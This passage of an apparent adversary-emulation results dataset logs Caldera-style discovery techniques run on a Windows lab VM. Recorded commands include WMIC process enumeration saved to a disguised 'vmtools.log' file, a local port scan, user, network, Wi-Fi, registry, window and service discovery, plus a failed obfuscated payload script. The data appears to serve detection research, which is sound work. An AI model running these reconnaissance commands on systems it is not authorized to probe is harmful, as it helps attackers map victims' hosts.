640              1600       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              1620       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1684                                                                                                                                     Memory Compression           4                1728       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1764       C:\\Python27\\pythonw.EXE                                                                                                       pythonw.exe                  1128             1800       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1808       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              1816       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              1844       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              1920       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1964       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              1972       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1980       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              1520       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              1944       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              2080       C:\\WINDOWS\\System32\\spoolsv.exe                                                                                               spoolsv.exe                  640              2108       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              2172       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              2212       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              2296       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              2324       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              2616       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              2652       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              2660       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              2672       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              2736       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              2748       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              2760       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              2784       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              2900       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              2948       C:\\WINDOWS\\System32\\OpenSSH\\sshd.exe                                                                                          sshd.exe                     640              2976       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              3000       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              3016                                                                                                                                     MsMpEng.exe                  640              3028       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              2284       C:\\WINDOWS\\system32\\dashost.exe                                                                                               dasHost.exe                  2748             3092       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              3408       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              3452                                                                                                                                     svchost.exe                  640              3748       C:\\WINDOWS\\system32\\sihost.exe                                                                                                sihost.exe                   1340             3824       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              3972       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              3380       C:\\WINDOWS\\system32\\taskhostw.exe                                                                                             taskhostw.exe                1128             2956       C:\\WINDOWS\\system32\\taskhostw.exe                                                                                             taskhostw.exe                1128             3780       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              4164       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              4264       C:\\WINDOWS\\system32\\ctfmon.exe                                                                                                ctfmon.exe                   4264             4372       C:\\WINDOWS\\Explorer.EXE                                                                                                       explorer.exe                 4664             4776       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              4812       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              5068       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              5088       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              2840       C:\\WINDOWS\\SystemApps\\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\\StartMenuExperienceHost.exe                     StartMenuExperienceHost.exe  776              5108       C:\\Windows\\System32\\RuntimeBroker.exe                                                                                         RuntimeBroker.exe            776              5224       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              5252       C:\\WINDOWS\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe                                                    SearchApp.exe                776              5492       C:\\Windows\\System32\\RuntimeBroker.exe                                                                                         RuntimeBroker.exe            776              5684       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              5800       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              5812                                                                                                                                     svchost.exe                  640              6088       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              6472       C:\\Program Files\\WindowsApps\\Microsoft.YourPhone_1.24021.105.0_x64__8wekyb3d8bbwe\\PhoneExperienceHost.exe                     PhoneExperienceHost.exe      776              6660       C:\\WINDOWS\\system32\\SearchIndexer.exe                                                                                         SearchIndexer.exe            640              6832       C:\\Windows\\System32\\RuntimeBroker.exe                                                                                         RuntimeBroker.exe            776              6940       C:\\WINDOWS\\SystemApps\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\TextInputHost.exe                                             TextInputHost.exe            776              7008       C:\\WINDOWS\\system32\\DllHost.exe                                                                                               dllhost.exe                  776              7164       C:\\Windows\\System32\\RuntimeBroker.exe                                                                                         RuntimeBroker.exe            776              3720       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              6152       C:\\Windows\\System32\\SecurityHealthSystray.exe                                                                                 SecurityHealthSystray.exe    4776             4052                                                                                                                                     SecurityHealthService.exe    640              4212       C:\\WINDOWS\\system32\\AUDIODG.EXE                                                                                               audiodg.exe                  1920             7696       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              7284       C:\\WINDOWS\\system32\\ApplicationFrameHost.exe                                                                                  ApplicationFrameHost.exe     776              8392       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              8900       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              7184       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              7236       C:\\WINDOWS\\system32\\cmd.exe                                                                                                   cmd.exe                      4776             7372       C:\\WINDOWS\\system32\\conhost.exe                                                                                               conhost.exe                  7372             7452       C:\\Program Files\\WindowsApps\\PythonSoftwareFoundation.Python.3.10_3.10.3056.0_x64__qbz5n2kfra8p0\\python3.10.exe               python3.10.exe               7372             7084       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              7864                                                                                                                                     SgrmBroker.exe               640              2088       C:\\Program Files\\Microsoft Update Health Tools\\uhssvc.exe                                                                     uhssvc.exe                   640              2632                                                                                                                                     svchost.exe                  640              1956       C:\\WINDOWS\\SystemApps\\ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe                                               ShellExperienceHost.exe      776              1304       C:\\Windows\\System32\\RuntimeBroker.exe                                                                                         RuntimeBroker.exe            776              6468       C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe                                                                                         WmiPrvSE.exe                 776              4896       C:\\Windows\\System32\\mousocoreworker.exe                                                                                       MoUsoCoreWorker.exe          776              7720       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              168                                                                                                                                      sppsvc.exe                   640              1640       C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe                                                                                         WmiPrvSE.exe                 776              5076       C:\\WINDOWS\\System32\\svchost.exe                                                                                               svchost.exe                  640              7684       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              4716       C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe                                                           MicrosoftEdgeUpdate.exe      1128             3036       C:\\WINDOWS\\servicing\\TrustedInstaller.exe                                                                                     TrustedInstaller.exe         640              8712       C:\\WINDOWS\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.3562_none_7e0523f67c93b82a\\TiWorker.exe  TiWorker.exe                 776              8380       C:\\WINDOWS\\system32\\SppExtComObj.exe                                                                                          SppExtComObj.Exe             776              2528       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              9140       C:\\Windows\\System32\\RuntimeBroker.exe                                                                                         RuntimeBroker.exe            776              8592                                                                                                                                     svchost.exe                  640              8224       C:\\WINDOWS\\system32\\cmd.exe                                                                                                   cmd.exe                      5952             5828       C:\\WINDOWS\\system32\\conhost.exe                                                                                               conhost.exe                  5828             3160       C:\\Users\\puma-4\\Desktop\\logstash-8.10.0\\jdk\\bin\\java.exe                                                                      java.exe                     5828             4360       C:\\WINDOWS\\system32\\SearchProtocolHost.exe                                                                                    SearchProtocolHost.exe       6832             1780       C:\\WINDOWS\\system32\\SearchFilterHost.exe                                                                                      SearchFilterHost.exe         6832             8632       C:\\Users\\puma-4\\Downloads\\SilkETW_SilkService_v8\\v8\\SilkService\\SilkService.exe                                               SilkService.exe              640              8468       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              8528       C:\\Users\\Public\\splunkd.exe                                                                                                   splunkd.exe                  4568             7244       C:\\WINDOWS\\system32\\conhost.exe                                                                                               conhost.exe                  7244             8432                                                                                                                                     svchost.exe                  640              5548       C:\\WINDOWS\\system32\\svchost.exe                                                                                               svchost.exe                  640              6568       C:\\WINDOWS\\system32\\rundll32.exe                                                                                              rundll32.exe                 3748             6460       C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe                                                                     powershell.exe               7244             8960       C:\\WINDOWS\\System32\\Wbem\\WMIC.exe                                                                                             WMIC.exe                     8960             8400       '],[''],['0'],"['wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;cat $env:APPDATA\\vmtools.log']","['Capture process id, executable path, pid and parent pid before writing to disk']",['WMIC Process Enumeration'],"[{'tactic': 'collection', 'technique_name': 'WMIC', 'technique_id': 'T1047'}]",['windows'],['psh']
55,Initial-Success,discovery,discovery :: Network Service Scanning,discovery :: ['Network Service Scanning'],discovery :: T1046,operation__stockpile_windows_depfalse_pshtrue__t1046__discovery__network_service_scanning__5a4cb2be-2684-4801-9355-3a90c91e0004__SAVED_2024-03-09_174017,stockpile_windows_depfalse_pshtrue__t1046__discovery__network_service_scanning__5a4cb2be-2684-4801-9355-3a90c91e0004,['5a4cb2be-2684-4801-9355-3a90c91e0004'],1,1,1,[0],['192.168.122.1 port 53 is open!192.168.122.1 port 80 is open!192.168.122.229 port 22 is open!192.168.122.229 port 445 is open!'],[''],['0'],"['Import-Module ./basic_scanner.ps1;$ports = @(22, 53, 80, 445);Get-NetIPConfiguration | ?{$_.NetAdapter.Status -ne ""Disconnected""} | Get-NetIPaddress -AddressFamily IPv4 | %{    $ipv4 = $_.IPAddress;    $prefixLength = $_.PrefixLength;    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;};']",['Scans the local network for common open ports'],['Network Service Scanning'],"[{'tactic': 'discovery', 'technique_name': 'Network Service Scanning', 'technique_id': 'T1046'}]",['windows'],['psh']
57,Initial-Success,discovery,discovery :: System Owner/User Discovery,discovery :: ['Current User'],discovery :: T1033,"operation__stockpile_windows_depfalse_pshtrue__t1033__discovery__system_owner,user_discovery__bd527b63-9f9e-46e0-9816-b8434d2b8989__SAVED_2024-03-09_171341","stockpile_windows_depfalse_pshtrue__t1033__discovery__system_owner,user_discovery__bd527b63-9f9e-46e0-9816-b8434d2b8989",['bd527b63-9f9e-46e0-9816-b8434d2b8989'],1,1,1,[0],['desktop-9ld827i\\puma-4'],[''],['0'],['whoami'],['Obtain user from current session'],['Current User'],"[{'tactic': 'discovery', 'technique_name': 'System Owner/User Discovery', 'technique_id': 'T1033'}]",['windows'],['psh']
61,Initial-Success,discovery,discovery :: System Network Configuration Discovery,discovery :: ['Network Interface Configuration'],discovery :: T1016,operation__stockpile_windows_depfalse_pshtrue__t1016__discovery__system_network_configuration_discovery__e8017c46-acb8-400c-a4b5-b3362b5b5baa__SAVED_2024-03-09_153553,stockpile_windows_depfalse_pshtrue__t1016__discovery__system_network_configuration_discovery__e8017c46-acb8-400c-a4b5-b3362b5b5baa,['e8017c46-acb8-400c-a4b5-b3362b5b5baa'],1,1,1,[0],['Windows IP ConfigurationEthernet adapter Ethernet Instance 0:   Connection-specific DNS Suffix  . :    Link-local IPv6 Address . . . . . : fe80::7ce:18e0:9115:ab55%9   IPv4 Address. . . . . . . . . . . : 192.168.122.229   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 192.168.122.1'],[''],['0'],['ipconfig'],['View network configuration info for host'],['Network Interface Configuration'],"[{'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}]",['windows'],['psh']
62,Initial-Success,discovery,discovery :: System Network Configuration Discovery,discovery :: ['Preferred WIFI'],discovery :: T1016,operation__stockpile_windows_depfalse_pshtrue__t1016__discovery__system_network_configuration_discovery__a0676fe1-cd52-482e-8dde-349b73f9aa69__SAVED_2024-03-09_152703,stockpile_windows_depfalse_pshtrue__t1016__discovery__system_network_configuration_discovery__a0676fe1-cd52-482e-8dde-349b73f9aa69,['a0676fe1-cd52-482e-8dde-349b73f9aa69'],1,1,1,[0],['Getting preferred WIFI networksThe Wireless AutoConfig Service (wlansvc) is not running.'],[''],['0'],['.\\wifi.ps1 -Pref'],['See the most used WIFI networks of a machine'],['Preferred WIFI'],"[{'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}]",['windows'],['psh']
63,Initial-Success,discovery,discovery :: System Network Configuration Discovery,discovery :: ['Find Domain'],discovery :: T1016,operation__stockpile_windows_depfalse_pshtrue__t1016__discovery__system_network_configuration_discovery__14a21534-350f-4d83-9dd7-3c56b93a0c17__SAVED_2024-03-09_150914,stockpile_windows_depfalse_pshtrue__t1016__discovery__system_network_configuration_discovery__14a21534-350f-4d83-9dd7-3c56b93a0c17,['14a21534-350f-4d83-9dd7-3c56b93a0c17'],1,1,1,[0],['    Ethernet Instance 0:Node IpAddress: [192.168.122.229] Scope Id: []                NetBIOS Local Name Table       Name               Type         Status    ---------------------------------------------    DESKTOP-9LD827I<00>  UNIQUE      Registered     WORKGROUP      <00>  GROUP       Registered     DESKTOP-9LD827I<20>  UNIQUE      Registered '],[''],['0'],['nbtstat -n'],['Find Domain information'],['Find Domain'],"[{'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}]",['windows'],['psh']
64,Initial-Success,discovery,discovery :: System Network Configuration Discovery,discovery :: ['Scan WIFI networks'],discovery :: T1016,operation__stockpile_windows_depfalse_pshtrue__t1016__discovery__system_network_configuration_discovery__9a30740d-3aa8-4c23-8efa-d51215e8a5b9__SAVED_2024-03-09_151803,stockpile_windows_depfalse_pshtrue__t1016__discovery__system_network_configuration_discovery__9a30740d-3aa8-4c23-8efa-d51215e8a5b9,['9a30740d-3aa8-4c23-8efa-d51215e8a5b9'],1,0,0,[1],[''],"["".\\obfuscated_payload.ps1 : The term '.\\obfuscated_payload.ps1' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:1+ .\\obfuscated_payload.ps1 -Scan+ ~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\obfuscated_payload.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ""]",['1'],['.\\obfuscated_payload.ps1 -Scan'],['View all potential WIFI networks on host'],['Scan WIFI networks'],"[{'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}]",['windows'],['psh']
65,Initial-Success,discovery,discovery :: Query Registry,discovery :: ['Query Registry'],discovery :: T1012,operation__stockpile_windows_depfalse_pshtrue__t1012__discovery__query_registry__2488245e-bcbd-405d-920e-2de27db882b3__SAVED_2024-03-09_150014,stockpile_windows_depfalse_pshtrue__t1012__discovery__query_registry__2488245e-bcbd-405d-920e-2de27db882b3,['2488245e-bcbd-405d-920e-2de27db882b3'],1,1,1,[0],['ProgramFilesDir          : C:\\Program FilesCommonFilesDir           : C:\\Program Files\\Common FilesProgramFilesDir (x86)    : C:\\Program Files (x86)CommonFilesDir (x86)     : C:\\Program Files (x86)\\Common FilesCommonW6432Dir           : C:\\Program Files\\Common FilesDevicePath               : C:\\WINDOWS\\infMediaPathUnexpanded      : C:\\WINDOWS\\MediaProgramFilesPath         : C:\\Program FilesProgramW6432Dir          : C:\\Program FilesSM_ConfigureProgramsName : Set Program Access and DefaultsSM_GamesName             : GamesPSPath                   : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVer                           sionPSParentPath             : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsPSChildName              : CurrentVersionPSDrive                  : HKLMPSProvider               : Microsoft.PowerShell.Core\\Registry'],[''],['0'],['Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion'],['Query Registry using PowerShell Get-ItemProperty'],['Query Registry'],"[{'tactic': 'discovery', 'technique_name': 'Query Registry', 'technique_id': 'T1012'}]",['windows'],['psh']
66,Initial-Success,discovery,discovery :: Application Window Discovery,discovery :: ['Application Window Discovery'],discovery :: T1010,operation__stockpile_windows_depfalse_pshtrue__t1010__discovery__application_window_discovery__5c65eec8-4839-4713-a4e1-86b2e75d1927__SAVED_2024-03-09_145110,stockpile_windows_depfalse_pshtrue__t1010__discovery__application_window_discovery__5c65eec8-4839-4713-a4e1-86b2e75d1927,['5c65eec8-4839-4713-a4e1-86b2e75d1927'],1,1,1,[0],['MainWindowTitle : Administrator: Command Prompt - python3  agent_for_custom_caldera_adv.pyMainWindowTitle : C:\\WINDOWS\\system32\\cmd.exeMainWindowTitle : Microsoft Text Input Application '],[''],['0'],"['$x = Get-Process | Where-Object {$_.MainWindowTitle -ne """"} | Select-Object MainWindowTitle;$a = New-Object -com ""Shell.Application""; $b = $a.windows() | select-object LocationName;write-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)']","['Extracts the names of all open non-explorer windows, and the locations of all explorer windows.']",['Application Window Discovery'],"[{'tactic': 'discovery', 'technique_name': 'Application Window Discovery', 'technique_id': 'T1010'}]",['windows'],['psh']
67,Initial-Success,discovery,discovery :: System Service Discovery,discovery :: ['Discover system services'],discovery :: T1007,operation__stockpile_windows_depfalse_pshtrue__t1007__discovery__system_service_discovery__c6607391-d02c-44b5-9b13-d3492ca58599__SAVED_2024-03-09_144216,stockpile_windows_depfalse_pshtrue__t1007__discovery__system_service_discovery__c6607391-d02c-44b5-9b13-d3492ca58599,['c6607391-d02c-44b5-9b13-d3492ca58599'],1,1,1,[0],['Status   Name               DisplayName                           ------   ----               -----------                           Stopped  AarSvc_3f9f4       Agent Activation Runtime_3f9f4        Stopped  AJRouter           AllJoyn Router Service                Stopped  ALG                Application Layer Gateway Service     Stopped  AppIDSvc           Application Identity                  Running  Appinfo            Application Information               Stopped  AppMgmt            Application Management                Stopped  AppReadiness       App Readiness                         Stopped  AppVClient         Microsoft App-V Client                Running  AppXSvc            AppX Deployment Service (AppXSVC)     Stopped  AssignedAccessM... AssignedAccessManager Service         Running  AudioEndpointBu... Windows Audio Endpoint Builder        Running  Audiosrv           Windows Audio                         Stopped  autotimesvc        Cellular Time                         Stopped  AxInstSV           ActiveX Installer (AxInstSV)          Stopped  BcastDVRUserSer... GameDVR and Broadcast User Service_...Stopped  BDESVC             BitLocker Drive Encryption Service    Running  BFE                Base Filtering Engine                 Stopped  BITS               Background Intelligent Transfer Ser...Stopped  BluetoothUserSe... Bluetooth User Support Service_3f9f4  Running  BrokerInfrastru... Background Tasks Infrastructure Ser...Stopped  BTAGService        Bluetooth Audio Gateway Service       Running  BthAvctpSvc        AVCTP service                         Stopped  bthserv            Bluetooth Support Service             Running  camsvc             Capability Access Manager Service     Stopped  CaptureService_... CaptureService_3f9f4                  Running  cbdhsvc_3f9f4      Clipboard User Service_3f9f4          Running  CDPSvc             Connected Devices Platform Service    Running  CDPUserSvc_3f9f4   Connected Devices Platform User Ser...Stopped  CertPropSvc        Certificate Propagation               Running  ClipSVC            Client License Service (ClipSVC)      Stopped  cloudidsvc         Microsoft Cloud Identity Service      Stopped  COMSysApp          COM+ System Application               Stopped  ConsentUxUserSv... ConsentUX_3f9f4                       Running  CoreMessagingRe... CoreMessaging                         Stopped  CredentialEnrol... CredentialEnrollmentManagerUserSvc_...Running  CryptSvc           Cryptographic Services                Stopped  CscService         Offline Files                         Running  DcomLaunch         DCOM Server Process Launcher          Stopped  dcsvc              dcsvc                                 Stopped  defragsvc          Optimize drives                       Stopped  DeviceAssociati... DeviceAssociationBroker_3f9f4         Running  DeviceAssociati... Device Association Service            Stopped  DeviceInstall      Device Install Service                Stopped  DevicePickerUse... DevicePicker_3f9f4                    Stopped  DevicesFlowUser... DevicesFlow_3f9f4                     Running  DevQueryBroker     DevQuery Background Discovery Broker  Running  Dhcp               DHCP Client                           Stopped  diagnosticshub.... Microsoft (R) Diagnostics Hub Stand...Stopped  diagsvc            Diagnostic Execution Service          Running  DiagTrack          Connected User Experiences and Tele...Stopped  DialogBlockingS... DialogBlockingService                 Running  DispBrokerDeskt... Display Policy Service                Stopped  DisplayEnhancem... Display Enhancement Service           Stopped  DmEnrollmentSvc    Device Management Enrollment Service  Stopped  dmwappushservice   Device Management Wireless Applicat...Running  Dnscache           DNS Client                            Running  DoSvc              Delivery Optimization                 Stopped  dot3svc            Wired AutoConfig                      Running  DPS                Diagnostic Policy Service             Running  DsmSvc             Device Setup Manager                  Stopped  DsSvc              Data Sharing Service                  Running  DusmSvc            Data Usage                            Stopped  Eaphost            Extensible Authentication Protocol    Running  edgeupdate         Microsoft Edge Update Service (edge...Stopped  edgeupdatem        Microsoft Edge Update Service (edge...Stopped  EFS                Encrypting File System (EFS)          Stopped  embeddedmode       Embedded Mode                         Stopped  EntAppSvc          Enterprise App Management Service     Running  EventLog           Windows Event Log                     Running  EventSystem        COM+ Event System                     Stopped  Fax                Fax                                   Stopped  fdPHost            Function Discovery Provider Host      Stopped  FDResPub           Function Discovery Resource Publica...Stopped  fhsvc              File History Service                  Running  FontCache          Windows Font Cache Service            Stopped  FrameServer        Windows Camera Frame Server           Running  gpsvc              Group Policy Client                   Stopped  GraphicsPerfSvc    GraphicsPerfSvc                       Stopped  hidserv            Human Interface Device Service        Stopped  HvHost             HV Host Service                       Stopped  icssvc             Windows Mobile Hotspot Service        Running  IKEEXT             IKE and AuthIP IPsec Keying Modules   Running  InstallService     Microsoft Store Install Service       Running  iphlpsvc           IP Helper                             Stopped  IpxlatCfgSvc       IP Translation Configuration Service  Running  KeyIso             CNG Key Isolation                     Stopped  KtmRm              KtmRm for Distributed Transaction C...Running  LanmanServer       Server                                Running  LanmanWorkstation  Workstation                           Running  lfsvc              Geolocation Service                   Running  LicenseManager     Windows License Manager Service       Stopped  lltdsvc            Link-Layer Topology Discovery Mapper  Running  lmhosts            TCP/IP NetBIOS Helper                 Running  LSM                Local Session Manager                 Stopped  LxpSvc             Language Experience Service           Stopped  MapsBroker         Downloaded Maps Manager               Stopped  McpManagementSe... McpManagementService                  Stopped  MessagingServic... MessagingService_3f9f4                Stopped  MicrosoftEdgeEl... Microsoft Edge Elevation Service (M...Stopped  MixedRealityOpe... Windows Mixed Reality OpenXR Service  Running  mpssvc             Windows Defender Firewall             Stopped  MSDTC              Distributed Transaction Coordinator   Stopped  MSiSCSI            Microsoft iSCSI Initiator Service     Stopped  msiserver          Windows Installer                     Stopped  MsKeyboardFilter   Microsoft Keyboard Filter             Stopped  NaturalAuthenti... Natural Authentication                Stopped  NcaSvc             Network Connectivity Assistant        Running  NcbService         Network Connection Broker             Stopped  NcdAutoSetup       Network Connected Devices Auto-Setup  Stopped  Netlogon           Netlogon                              Stopped  Netman             Network Connections                   Running  netprofm           Network List Service                  Stopped  NetSetupSvc        Network Setup Service                 Stopped  NetTcpPortSharing  Net.Tcp Port Sharing Service          Running  NgcCtnrSvc         Microsoft Passport Container          Stopped  NgcSvc             Microsoft Passport                    Running  NlaSvc             Network Location Awareness            Running  nsi                Network Store Interface Service       Running  OneSyncSvc_3f9f4   Sync Host_3f9f4                       Stopped  p2pimsvc           Peer Networking Identity Manager      Stopped  p2psvc             Peer Networking Grouping              Running  PcaSvc             Program Compatibility Assistant Ser...Stopped  PeerDistSvc        BranchCache                           Stopped  perceptionsimul... Windows Perception Simulation Service Stopped  PerfHost           Performance Counter DLL Host          Stopped  PhoneSvc           Phone Service                         Running  PimIndexMainten... Contact Data_3f9f4                    Stopped  pla                Performance Logs & Alerts             Running  PlugPlay           Plug and Play                         Stopped  PNRPAutoReg        PNRP Machine Name Publication Service Stopped  PNRPsvc            Peer Name Resolution Protocol         Running  PolicyAgent        IPsec Policy Agent                    Running  Power              Power                                 Stopped  PrintNotify        Printer Extensions and Notifications  Stopped  PrintWorkflowUs... PrintWorkflow_3f9f4                   Running  ProfSvc            User Profile Service                  Stopped  PushToInstall      Windows PushToInstall Service         Stopped  QWAVE              Quality Windows Audio Video ExperienceStopped  RasAuto            Remote Access Auto Connection Manager Running  RasMan             Remote Access Connection Manager      Stopped  RemoteAccess       Routing and Remote Access             Stopped  RemoteRegistry     Remote Registry                       Stopped  RetailDemo         Retail Demo Service                   Running  RmSvc              Radio Management Service              Running  RpcEptMapper       RPC Endpoint Mapper                   Stopped  RpcLocator         Remote Procedure Call (RPC) Locator   Running  RpcSs              Remote Procedure Call (RPC)           Running  SamSs              Security Accounts Manager             Stopped  SCardSvr           Smart Card                            Stopped  ScDeviceEnum       Smart Card Device Enumeration Service Running  Schedule           Task Scheduler                        Stopped  SCPolicySvc        Smart Card Removal Policy             Stopped  SDRSVC             Windows Backup                        Stopped  seclogon           Secondary Logon                       Running  SecurityHealthS... Windows Security Service              Running  SEMgrSvc           Payments and NFC/SE Manager           Running  SENS               System Event Notification Service     Stopped  Sense              Windows Defender Advanced Threat Pr...Stopped  SensorDataService  Sensor Data Service                   Stopped  SensorService      Sensor Service                        Stopped  SensrSvc           Sensor Monitoring Service             Stopped  SessionEnv         Remote Desktop Configuration          Running  SgrmBroker         System Guard Runtime Monitor Broker   Stopped  SharedAccess       Internet Connection Sharing (ICS)     Stopped  SharedRealitySvc   Spatial Data Service                  Running  ShellHWDetection   Shell Hardware Detection              Stopped  shpamsvc           Shared PC Account Manager             Running  SilkService        SilkService                           Stopped  smphost            Microsoft Storage Spaces SMP          Stopped  SmsRouter          Microsoft Windows SMS Router Service. Stopped  SNMPTRAP           SNMP Trap                             Stopped  spectrum           Windows Perception Service            Running  Spooler            Print Spooler                         Running  sppsvc             Software Protection                   Running  SSDPSRV            SSDP Discovery                        Stopped  ssh-agent          OpenSSH Authentication Agent          Running  sshd               OpenSSH SSH Server                    Running  SstpSvc            Secure Socket Tunneling Protocol Se...Running  StateRepository    State Repository Service              Stopped  stisvc             Windows Image Acquisition (WIA)       Running  StorSvc            Storage Service                       Stopped  svsvc              Spot Verifier                         Stopped  swprv              Microsoft Software Shadow Copy Prov...Running  SysMain            SysMain                               Running  SystemEventsBroker System Events Broker                  Running  TabletInputService Touch Keyboard and Handwriting Pane...Stopped  TapiSrv            Telephony                             Stopped  TermService        Remote Desktop Services               Running  Themes             Themes                                Stopped  TieringEngineSe... Storage Tiers Management              Running  TimeBrokerSvc      Time Broker                           Running  TokenBroker        Web Account Manager                   Running  TrkWks             Distributed Link Tracking Client      Stopped  TroubleshootingSvc Recommended Troubleshooting Service   Running  TrustedInstaller   Windows Modules Installer             Stopped  tzautoupdate       Auto Time Zone Updater                Stopped  UdkUserSvc_3f9f4   Udk User Service_3f9f4                Stopped  UevAgentService    User Experience Virtualization ServiceRunning  uhssvc             Microsoft Update Health Service       Stopped  UmRdpService       Remote Desktop Services UserMode Po...Running  UnistoreSvc_3f9f4  User Data Storage_3f9f4               Stopped  upnphost           UPnP Device Host                      Running  UserDataSvc_3f9f4  User Data Access_3f9f4                Running  UserManager        User Manager                          Running  UsoSvc             Update Orchestrator Service           Stopped  VacSvc             Volumetric Audio Compositor Service   Running  VaultSvc           Credential Manager                    Stopped  vds                Virtual Disk                          Stopped  vmicguestinterface Hyper-V Guest Service Interface       Stopped  vmicheartbeat      Hyper-V Heartbeat Service             Stopped  vmickvpexchange    Hyper-V Data Exchange Service         Stopped  vmicrdv            Hyper-V Remote Desktop Virtualizati...Stopped  vmicshutdown       Hyper-V Guest Shutdown Service        Stopped  vmictimesync       Hyper-V Time Synchronization Service  Stopped  vmicvmsession      Hyper-V PowerShell Direct Service     Stopped  vmicvss            Hyper-V Volume Shadow Copy Requestor  Stopped  VSS                Volume Shadow Copy                    Running  W32Time            Windows Time                          Running  WaaSMedicSvc       Windows Update Medic Service          Stopped  WalletService      WalletService                         Stopped  WarpJITSvc         WarpJITSvc                            Stopped  wbengine           Block Level Backup Engine Service     Running  WbioSrvc           Windows Biometric Service             Running  Wcmsvc             Windows Connection Manager            Stopped  wcncsvc            Windows Connect Now - Config RegistrarRunning  WdiServiceHost     Diagnostic Service Host               Running  WdiSystemHost      Diagnostic System Host                Stopped  WdNisSvc           Microsoft Defender Antivirus Networ...Stopped  WebClient          